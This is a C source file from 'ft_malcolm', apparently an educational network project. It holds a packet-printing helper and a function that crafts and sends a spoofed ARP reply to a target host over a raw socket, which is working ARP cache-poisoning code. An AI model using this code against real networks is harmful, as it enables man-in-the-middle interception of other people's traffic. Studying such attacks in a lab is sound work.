/*
** ============================================================================
** MACRO DEFINITIONS & DOCUMENTATION
** ============================================================================
** TOTAL_PACKET_LEN: Combined length of Ethernet and ARP headers.
** ETHERTYPE_ARP: Hex constant 0x0806, identifying ARP protocol.
** ETHERTYPE_IP: Hex constant 0x0800, identifying IPv4.
** ARPHRD_ETHER: Hardware type 1 (Ethernet).
** ARPOP_REQUEST: ARP opcode 1 (Request).
** ARPOP_REPLY: ARP opcode 2 (Reply).
** ETH_ALEN: Ethernet address length (6 bytes).
** IP4_ALEN: IPv4 address length (4 bytes).
** AF_PACKET: Low-level packet interface address family.
*/

#include "ft_malcolm.h"

/**
 * print_packet_verbose - Prints dissected packet fields (Bonus).
 * @buffer: The packet buffer.
 * @len: Packet length.
 */
void	print_packet_verbose(const uint8_t *buffer, size_t len)
{
	const t_arp_packet	*pkt;
	char				mac_buf[18];
	char				ip_buf[INET_ADDRSTRLEN];

	if (len < TOTAL_PACKET_LEN)
		return ;
	pkt = (const t_arp_packet *)buffer;
	printf("--- [ Ethernet Frame ] ---\n");
	format_mac(pkt->eth.dest, mac_buf, sizeof(mac_buf));
	printf("  Destination MAC: %s\n", mac_buf);
	format_mac(pkt->eth.src, mac_buf, sizeof(mac_buf));
	printf("  Source MAC:      %s\n", mac_buf);
	printf("  EtherType:       0x%04x\n", ntohs(pkt->eth.proto));
	printf("--- [ ARP Header ] ---\n");
	printf("  Hardware type:   %u\n", ntohs(pkt->arp.hrd));
	printf("  Protocol type:   0x%04x\n", ntohs(pkt->arp.pro));
	printf("  Hardware size:   %u\n", pkt->arp.hln);
	printf("  Protocol size:   %u\n", pkt->arp.pln);
	printf("  Opcode:          %u (%s)\n", ntohs(pkt->arp.op),
		ntohs(pkt->arp.op) == ARPOP_REQUEST ? "Request" :
		(ntohs(pkt->arp.op) == ARPOP_REPLY ? "Reply" : "Unknown"));
	format_mac(pkt->arp.sha, mac_buf, sizeof(mac_buf));
	format_ip(pkt->arp.spa, ip_buf, sizeof(ip_buf));
	printf("  Sender MAC / IP: %s / %s\n", mac_buf, ip_buf);
	format_mac(pkt->arp.tha, mac_buf, sizeof(mac_buf));
	format_ip(pkt->arp.tpa, ip_buf, sizeof(ip_buf));
	printf("  Target MAC / IP: %s / %s\n", mac_buf, ip_buf);
	printf("----------------------\n");
}

/**
 * send_arp_reply - Crafts and sends a spoofed ARP reply.
 * @ctx: The application context containing configuration.
 * @return: 0 on success, -1 on failure.
 */
int	send_arp_reply(t_malcolm_ctx *ctx)
{
	t_arp_packet		packet;
	struct sockaddr_ll	sll;
	ssize_t				sent;

	ft_bzero(&packet, sizeof(packet));
	ft_memcpy(packet.eth.dest, ctx->tgt_mac, ETH_ALEN);
	ft_memcpy(packet.eth.src, ctx->src_mac, ETH_ALEN);
	packet.eth.proto = htons(ETHERTYPE_ARP);

	packet.arp.hrd = htons(ARPHRD_ETHER);
	packet.arp.pro = htons(ETHERTYPE_IP);
	packet.arp.hln = ETH_ALEN;
	packet.arp.pln = IP4_ALEN;
	packet.arp.op = htons(ARPOP_REPLY);
	ft_memcpy(packet.arp.sha, ctx->src_mac, ETH_ALEN);
	ft_memcpy(packet.arp.spa, ctx->src_ip, IP4_ALEN);
	ft_memcpy(packet.arp.tha, ctx->tgt_mac, ETH_ALEN);
	ft_memcpy(packet.arp.tpa, ctx->tgt_ip, IP4_ALEN);

	ft_bzero(&sll, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ctx->ifindex;
	sll.sll_halen = ETH_ALEN;
	ft_memcpy(sll.sll_addr, ctx->tgt_mac, ETH_ALEN);

	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
	if (ctx->verbose)
		print_packet_verbose((const uint8_t *)&packet, sizeof(packet));
	sent = sendto(ctx->sockfd, &packet, sizeof(packet), 0,
			(struct sockaddr *)&sll, sizeof(sll));
	if (sent < 0)
	{
		fprintf(stderr, "ft_malcolm: sendto failed: %s\n", strerror(errno));
		return (-1);
	}
	printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
	return (0);
}
